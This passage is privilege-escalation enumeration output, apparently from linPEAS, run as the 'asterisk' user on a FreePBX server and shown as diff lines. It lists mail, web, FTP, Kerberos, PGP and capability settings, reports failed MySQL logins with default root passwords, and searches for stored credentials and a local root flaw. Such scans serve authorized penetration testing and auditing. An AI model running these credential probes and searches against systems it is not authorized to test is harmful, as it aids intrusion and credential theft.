+#  flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r $nexthop ($recipient)
+#  flags=Fq. user=bsmtp argv=/usr/local/sbin/bsmtp -f $sender $nexthop $recipient
+#  flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store
+#  flags=FR user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py
+
+-rwxr-xr-x. 1 root root 122032 Apr  1  2020 /usr/sbin/postfix
+
+drwx------. 2 postfix root 25 Nov 30  2025 /var/lib/postfix
+find: ‘/var/lib/postfix’: Permission denied
+
+drwxr-xr-x. 16 root root 201 Nov 30  2025 /var/spool/postfix
+find: ‘/var/spool/postfix/active’: Permission denied
+find: ‘/var/spool/postfix/bounce’: Permission denied
+find: ‘/var/spool/postfix/corrupt’: Permission denied
+find: ‘/var/spool/postfix/defer’: Permission denied
+find: ‘/var/spool/postfix/deferred’: Permission denied
+find: ‘/var/spool/postfix/flush’: Permission denied
+find: ‘/var/spool/postfix/hold’: Permission denied
+find: ‘/var/spool/postfix/incoming’: Permission denied
+find: ‘/var/spool/postfix/maildrop’: Permission denied
+find: ‘/var/spool/postfix/private’: Permission denied
+find: ‘/var/spool/postfix/public’: Permission denied
+find: ‘/var/spool/postfix/saved’: Permission denied
+find: ‘/var/spool/postfix/trace’: Permission denied
+
+
+╔══════════╣ Analyzing Http conf Files (limit 70)
+-rw-r--r-- 1 root root 11755 Dec  3  2025 /etc/httpd/conf/httpd.conf
+-rw-r--r--. 1 root root 77 Nov 27  2019 /usr/lib/tmpfiles.d/httpd.conf
+
+╔══════════╣ Analyzing Env Files (limit 70)
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 26  1985 /var/www/html/admin/modules/api/node/node_modules/psl/.env
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 26  1985 /var/www/html/admin/modules/iotserver/node/node_modules/psl/.env
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 26  1985 /var/www/html/admin/modules/sangomaconnect/node/node_modules/psl/.env
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 26  1985 /var/www/html/admin/modules/ucp/node/node_modules/psl/.env
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 26  1985 /var/www/html/admin/modules/zulu/node/node_modules/psl/.env
+
+╔══════════╣ Analyzing Proxy Config Files (limit 70)
+-rw-r--r--. 1 root root 0 Apr  1  2020 /etc/environment
+
+
+
+╔══════════╣ Analyzing Github Files (limit 70)
+drwxr-xr-x. 2 asterisk asterisk 25 Nov 30  2025 /home/asterisk/.node/lib/node_modules/npm-cache/node_modules/balanced-match/.github
+drwxr-xr-x. 2 asterisk asterisk 25 Nov 30  2025 /home/asterisk/.node/lib/node_modules/npm-cache/node_modules/minimist/.github
+drwxr-xr-x. 2 root root 63 Nov 30  2025 /usr/lib/node_modules/npm/node_modules/node-gyp/.github
+drwxrwxr-x. 3 asterisk asterisk 23 Nov 30  2025 /var/www/html/admin/libraries/Composer/vendor/doctrine/annotations/.github
+drwxrwxr-x. 3 asterisk asterisk 42 Nov 30  2025 /var/www/html/admin/libraries/Composer/vendor/doctrine/instantiator/.github
+drwxrwxr-x. 2 asterisk asterisk 63 Nov 30  2025 /var/www/html/admin/libraries/Composer/vendor/swiftmailer/swiftmailer/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/libraries/Composer/vendor/tedivm/jshrink/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/api/node/node_modules/aws4/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/api/node/node_modules/balanced-match/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/api/node/node_modules/fast-json-stable-stringify/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/api/node/node_modules/qs/.github
+drwxrwxr-x. 3 asterisk asterisk 23 Nov 30  2025 /var/www/html/admin/modules/calendar/vendor/om/icalparser/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/array-includes/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/array.prototype.flat/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/aws4/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/balanced-match/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/call-bind/.github
+drwxrwxr-x. 3 asterisk asterisk 23 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/chance/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/define-properties/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/d/.github
+drwxrwxr-x. 3 asterisk asterisk 23 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/dicer/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/es6-symbol/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/es-shim-unscopables/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/es-to-primitive/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/fast-json-stable-stringify/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/filelist/node_modules/brace-expansion/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/flatted/.github
+drwxrwxr-x. 3 asterisk asterisk 42 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/formidable/node_modules/qs/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/function.prototype.name/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/functions-have-names/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/get-intrinsic/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/get-symbol-description/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/has-bigints/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/has-property-descriptors/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/has-symbols/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/has-tostringtag/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/internal-slot/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/is-arguments/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/is-bigint/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/is-boolean-object/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/is-callable/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/is-date-object/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/is-negative-zero/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/is-number-object/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/is-shared-array-buffer/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/is-string/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/is-symbol/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/is-weakref/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/minimist/.github
+drwxrwxr-x. 3 asterisk asterisk 23 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/needle/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/next-tick/.github
+drwxrwxr-x. 2 asterisk asterisk 23 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/node-cron/.github
+drwxrwxr-x. 2 asterisk asterisk 26 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/npm-normalize-package-bin/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/object.assign/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/object-inspect/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/qs/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/request/node_modules/qs/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/resolve/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/safe-regex-test/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/side-channel/.github
+drwxrwxr-x. 3 asterisk asterisk 23 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/streamsearch/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/supports-preserve-symlinks-flag/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/traverse/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/unbox-primitive/.github
+drwxrwxr-x. 3 asterisk asterisk 23 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/websocket/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/iotserver/node/node_modules/which-boxed-primitive/.github
+drwxrwxr-x. 3 asterisk asterisk 45 Nov 30  2025 /var/www/html/admin/modules/pm2/node/node_modules/ast-types/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/pm2/node/node_modules/balanced-match/.github
+drwxrwxr-x. 2 asterisk asterisk 44 Nov 30  2025 /var/www/html/admin/modules/pm2/node/node_modules/function-bind/.github
+drwxrwxr-x. 2 asterisk asterisk 25 Nov 30  2025 /var/www/html/admin/modules/pm2/node/node_modules/hasown/.github
+
+
+
+
+╔══════════╣ Analyzing FTP Files (limit 70)
+-rw-r--r--. 1 root root 621 Aug 19  2014 /etc/fail2ban/filter.d/vsftpd.conf
+-rw-------. 1 root root 5116 Apr  1  2020 /etc/vsftpd/vsftpd.conf
+-rw-r--r--. 1 root root 565 Feb  2  2008 /usr/share/doc/vsftpd-3.0.2/EXAMPLE/INTERNET_SITE_NOINETD/vsftpd.conf
+anonymous_enable=YES
+local_enable
+write_enable
+anon_upload_enable
+
+anon_mkdir_write_enable
+anon_other_write_enable
+-rw-r--r--. 1 root root 507 Feb  2  2008 /usr/share/doc/vsftpd-3.0.2/EXAMPLE/INTERNET_SITE/vsftpd.conf
+anonymous_enable=YES
+local_enable
+write_enable
+anon_upload_enable
+anon_mkdir_write_enable
+anon_other_write_enable
+-rw-r--r--. 1 root root 260 Feb  2  2008 /usr/share/doc/vsftpd-3.0.2/EXAMPLE/VIRTUAL_USERS/vsftpd.conf
+anonymous_enable
+local_enable=YES
+write_enable
+anon_upload_enable
+anon_mkdir_write_enable
+anon_other_write_enable
+
+
+
+
+
+
+
+
+
+╔══════════╣ Analyzing Other Interesting Files (limit 70)
+-rw-r--r--. 1 root root 231 Apr  1  2020 /etc/skel/.bashrc
+-rw-r--r--. 1 asterisk asterisk 231 Dec  6  2016 /home/asterisk/.bashrc
+-rw-r--r-- 1 root root 19 Nov 30  2025 /var/lib/asterisk/.bashrc
+
+
+
+
+
+
+
+
+
+╔══════════╣ Analyzing Windows Files (limit 70)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-rw-r--r--. 1 root root 570 Nov 27  2019 /etc/my.cnf
+-rw-rw-r--. 1 asterisk asterisk 161 Nov  2  2023 /var/www/html/admin/modules/iotserver/node/my.cnf
+
+
+
+
+
+
+
+
+
+-rw-r--r--. 1 root root 475 Apr  7  2020 /usr/lib/firewalld/services/vnc-server.xml
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+╔══════════╣ Searching kerberos conf files and tickets (T1558.003)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-active-directory.html#linux-active-directory
+ptrace protection is enabled (), you need to disable it to search for tickets inside processes memory
+-rw-r--r--. 1 root root 646 Mar 31  2020 /etc/krb5.conf
+# Configuration snippets may be placed in this directory as well
+includedir /etc/krb5.conf.d/
+
+[logging]
+ default = FILE:/var/log/krb5libs.log
+ kdc = FILE:/var/log/krb5kdc.log
+ admin_server = FILE:/var/log/kadmind.log
+
+[libdefaults]
+ dns_lookup_realm = false
+ ticket_lifetime = 24h
+ renew_lifetime = 7d
+ forwardable = true
+ rdns = false
+ pkinit_anchors = FILE:/etc/pki/tls/certs/ca-bundle.crt
+# default_realm = EXAMPLE.COM
+ default_ccache_name = KEYRING:persistent:%{uid}
+
+[realms]
+# EXAMPLE.COM = {
+#  kdc = kerberos.example.com
+#  admin_server = kerberos.example.com
+# }
+
+[domain_realm]
+# .example.com = EXAMPLE.COM
+# example.com = EXAMPLE.COM
+-rw-r--r--. 1 root root 369 Apr  1  2020 /usr/share/doc/krb5-libs-1.15.1/examples/krb5.conf
+[libdefaults]
+	default_realm = ATHENA.MIT.EDU
+
+[realms]
+# use "kdc = ..." if realm admins haven't put SRV records into DNS
+	ATHENA.MIT.EDU = {
+		admin_server = kerberos.mit.edu
+	}
+	ANDREW.CMU.EDU = {
+		admin_server = kdc-01.andrew.cmu.edu
+	}
+
+[domain_realm]
+	mit.edu = ATHENA.MIT.EDU
+	csail.mit.edu = CSAIL.MIT.EDU
+	.ucsc.edu = CATS.UCSC.EDU
+
+[logging]
+#	kdc = CONSOLE
+tickets kerberos Not Found
+klist Not Found
+
+
+╔══════════╣ Searching mysql credentials and exec (T1552.001)
+
+╔══════════╣ MySQL version (T1552.001)
+mysql  Ver 15.1 Distrib 5.5.65-MariaDB, for Linux (x86_64) using readline 5.1
+
+
+═╣ MySQL connection using default root/root ........... No
+═╣ MySQL connection using root/toor ................... No
+═╣ MySQL connection using root/NOPASS ................. No
+
+Unable to determine MySQL version.
+╔══════════╣ Analyzing PGP-GPG Files (limit 70)
+/usr/bin/gpg
+/home/asterisk/.gnupg/pubring.gpg
+---------------------------------
+pub   4096R/755231A3 2019-12-13
+uid                  FreePBX Mirror Servers <security@freepbx.org>
+sub   4096R/B2584FE1 2019-12-13
+
+pub   4096R/6BD35B34 2019-12-13
+uid                  FreePBX Module Signing (This is the master key to sign FreePBX Modules) v2 <modules@freepbx.org>
+sub   4096R/C7DAD6CD 2019-12-13
+sub   4096R/53CD0B27 2019-12-13
+
+pub   4096R/B33B4659 2014-04-30
+uid                  FreePBX Module Signing (This is the master key to sign FreePBX Modules) <modules@freepbx.org>
+sub   4096R/5C2FE148 2014-04-30
+
+pub   4096R/FE6D84F7 2016-05-04
+uid                  FreePBX Mirror 1 (Module Signing - 2016/2017) <security@freepbx.org>
+sub   4096R/A6869B39 2016-05-04
+
+pub   4096R/69D2EAD9 2014-05-05
+uid                  FreePBX Mirror 1 (Module Signing - 2014/2015) <security@freepbx.org>
+sub   4096R/CCEBF9CB 2014-05-05
+
+netpgpkeys Not Found
+netpgp Not Found
+
+-rw-rw-r--. 1 asterisk asterisk 16236 Nov  2  2023 /home/asterisk/.gnupg/pubring.gpg
+-rw-rw-r--. 1 asterisk asterisk 0 Nov  2  2023 /home/asterisk/.gnupg/secring.gpg
+-rw-rw-r--. 1 asterisk asterisk 1600 Nov  2  2023 /home/asterisk/.gnupg/trustdb.gpg
+
+-rw-rw-r--. 1 asterisk asterisk 488 Nov  2  2023 /var/www/html/admin/libraries/Composer/vendor/paragonie/random_compat/dist/random_compat.phar.pubkey.asc
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2.0.22 (MingW32)
+iQEcBAABAgAGBQJWtW1hAAoJEGuXocKCZATaJf0H+wbZGgskK1dcRTsuVJl9IWip
+QwGw/qIKI280SD6/ckoUMxKDCJiFuPR14zmqnS36k7N5UNPnpdTJTS8T11jttSpg
+1LCmgpbEIpgaTah+cELDqFCav99fS+bEiAL5lWDAHBTE/XPjGVCqeehyPYref4IW
+NDBIEsvnHPHPLsn6X5jq4+Yj5oUixgxaMPiR+bcO4Sh+RzOVB6i2D0upWfRXBFXA
+NNnsg9/zjvoC7ZW73y9uSH+dPJTt/Vgfeiv52/v41XliyzbUyLalf02GNPY+9goV
+JHG1ulEEBJOCiUD9cE1PUIJwHA/HqyhHIvV350YoEFiHl8iSwm7SiZu5kPjaq74=
+=B6+8
+-----END PGP SIGNATURE-----
+-rw-rw-r--. 1 asterisk asterisk 3104 Nov  2  2023 /var/www/html/admin/modules/api/vendor/defuse/php-encryption/dist/signingkey.asc
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: GnuPG v2
+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
+IEgAL/CYqrk38w==
+=lmD7
+-----END PGP PUBLIC KEY BLOCK-----
+-rw-rw-r--. 1 asterisk asterisk 488 Nov  2  2023 /var/www/html/admin/modules/api/vendor/paragonie/random_compat/dist/random_compat.phar.pubkey.asc
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2.0.22 (MingW32)
+iQEcBAABAgAGBQJWtW1hAAoJEGuXocKCZATaJf0H+wbZGgskK1dcRTsuVJl9IWip
+QwGw/qIKI280SD6/ckoUMxKDCJiFuPR14zmqnS36k7N5UNPnpdTJTS8T11jttSpg
+1LCmgpbEIpgaTah+cELDqFCav99fS+bEiAL5lWDAHBTE/XPjGVCqeehyPYref4IW
+NDBIEsvnHPHPLsn6X5jq4+Yj5oUixgxaMPiR+bcO4Sh+RzOVB6i2D0upWfRXBFXA
+NNnsg9/zjvoC7ZW73y9uSH+dPJTt/Vgfeiv52/v41XliyzbUyLalf02GNPY+9goV
+JHG1ulEEBJOCiUD9cE1PUIJwHA/HqyhHIvV350YoEFiHl8iSwm7SiZu5kPjaq74=
+=B6+8
+-----END PGP SIGNATURE-----
+-rw-rw-r--. 1 asterisk asterisk 488 Nov  2  2023 /var/www/html/admin/modules/cloudmigration/vendor/paragonie/random_compat/dist/random_compat.phar.pubkey.asc
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2.0.22 (MingW32)
+iQEcBAABAgAGBQJWtW1hAAoJEGuXocKCZATaJf0H+wbZGgskK1dcRTsuVJl9IWip
+QwGw/qIKI280SD6/ckoUMxKDCJiFuPR14zmqnS36k7N5UNPnpdTJTS8T11jttSpg
+1LCmgpbEIpgaTah+cELDqFCav99fS+bEiAL5lWDAHBTE/XPjGVCqeehyPYref4IW
+NDBIEsvnHPHPLsn6X5jq4+Yj5oUixgxaMPiR+bcO4Sh+RzOVB6i2D0upWfRXBFXA
+NNnsg9/zjvoC7ZW73y9uSH+dPJTt/Vgfeiv52/v41XliyzbUyLalf02GNPY+9goV
+JHG1ulEEBJOCiUD9cE1PUIJwHA/HqyhHIvV350YoEFiHl8iSwm7SiZu5kPjaq74=
+=B6+8
+-----END PGP SIGNATURE-----
+-rw-rw-r--. 1 asterisk asterisk 488 Nov  2  2023 /var/www/html/admin/modules/userman/vendor/paragonie/random_compat/dist/random_compat.phar.pubkey.asc
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2.0.22 (MingW32)
+iQEcBAABAgAGBQJWtW1hAAoJEGuXocKCZATaJf0H+wbZGgskK1dcRTsuVJl9IWip
+QwGw/qIKI280SD6/ckoUMxKDCJiFuPR14zmqnS36k7N5UNPnpdTJTS8T11jttSpg
+1LCmgpbEIpgaTah+cELDqFCav99fS+bEiAL5lWDAHBTE/XPjGVCqeehyPYref4IW
+NDBIEsvnHPHPLsn6X5jq4+Yj5oUixgxaMPiR+bcO4Sh+RzOVB6i2D0upWfRXBFXA
+NNnsg9/zjvoC7ZW73y9uSH+dPJTt/Vgfeiv52/v41XliyzbUyLalf02GNPY+9goV
+JHG1ulEEBJOCiUD9cE1PUIJwHA/HqyhHIvV350YoEFiHl8iSwm7SiZu5kPjaq74=
+=B6+8
+-----END PGP SIGNATURE-----
+
+-rw-rw-r--. 1 asterisk asterisk 0 Nov  2  2023 /home/asterisk/.gnupg/secring.gpg
+
+
+-rw-rw-r--. 1 asterisk asterisk 1600 Nov  2  2023 /home/asterisk/.gnupg/trustdb.gpg
+
+
+
+
+drwxrwxr-x. 2 asterisk asterisk 83 Jun 21 18:46 /home/asterisk/.gnupg
+
+╔══════════╣ Checking for PackageKit Pack2TheRoot (CVE-2026-41651) (T1068)
+╚ https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html
+PackageKit Not Found
+
+
+╔══════════╣ Searching screen sessions (T1563)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions
+Screen version 4.01.00devel (GNU) 2-May-06
+No Sockets found in /var/run/screen/S-asterisk.
+
+/run/screen/S-asterisk══╣ Checking other users screen sessions (T1563)
+User root screen sessions:
+Must run suid root for multiuser support.
+
+╔══════════╣ Searching uncommon passwd files (splunk) (T1552.001)
+passwd file: /etc/pam.d/passwd
+passwd file: /etc/passwd
+passwd file: /usr/share/bash-completion/completions/passwd
+
+╔══════════╣ Searching ssl/ssh files (T1552.004,T1021.004)
+╔══════════╣ Analyzing SSH Files (limit 70)
+Files with capabilities (limited to 50):
+/usr/bin/newgidmap = cap_setgid+ep
+/usr/bin/newuidmap = cap_setuid+ep
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/dumpcap = cap_net_admin,cap_net_raw+ep
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+/usr/sbin/mtr = cap_net_raw+ep
+
+╔══════════╣ Checking misconfigurations of ld.so (T1574.006)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso
+/etc/ld.so.conf
+Content of /etc/ld.so.conf:
+include ld.so.conf.d/*.conf
+ld.so.conf.d
+
+/etc/ld.so.preload
